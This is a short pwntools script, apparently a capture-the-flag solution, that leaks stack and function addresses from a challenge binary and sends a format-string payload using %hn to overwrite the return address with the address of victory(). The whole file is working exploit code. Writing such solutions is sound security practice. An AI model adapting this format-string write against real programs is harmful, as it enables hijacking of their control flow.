from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('rivit.dev', 10016)
    else:
        r = process('./task')

    # context.log_level = "debug"               # debug the output from target server
    r.recvuntil("Address of victory: ")
    victory_addr = int(r.recv(10).decode(), 16)

    r.recvuntil("Address of buf: ")
    buf_addr = int(r.recv(10).decode(), 16)

    r.recvuntil("Return address: ")
    ret_addr = int(r.recv(10).decode(), 16)

    log.info(f"Address of victory(): {hex(victory_addr)}")
    log.info(f"Address of buf: {hex(buf_addr)}")
    log.info(f'Return address: {hex(ret_addr)}')

    ret_addr_stack = buf_addr + 0x90                                    # Get the stack's return address
    # first_two_byte = (victory_addr & 0xffff0000) >> 16
    last_two_byte = (victory_addr & 0xffff)
    
    log.info(f"Stack's return address: {hex(ret_addr_stack)}")
    # log.info(f'First 2 bytes of victory(): {str(first_two_byte)}')     # 5 or 6 bytes
    log.info(f'Last 2 bytes of victory(): {str(last_two_byte)}')       # 4 or 5 bytes

    payload = ('%' + str(last_two_byte) + 'x%11$hnAAA' + 'A'*(5 - len(str(last_two_byte)))).encode()
    payload += p32(ret_addr_stack)
    
    print(payload)
    r.sendline(payload)
    
    r.interactive()
exploit(True)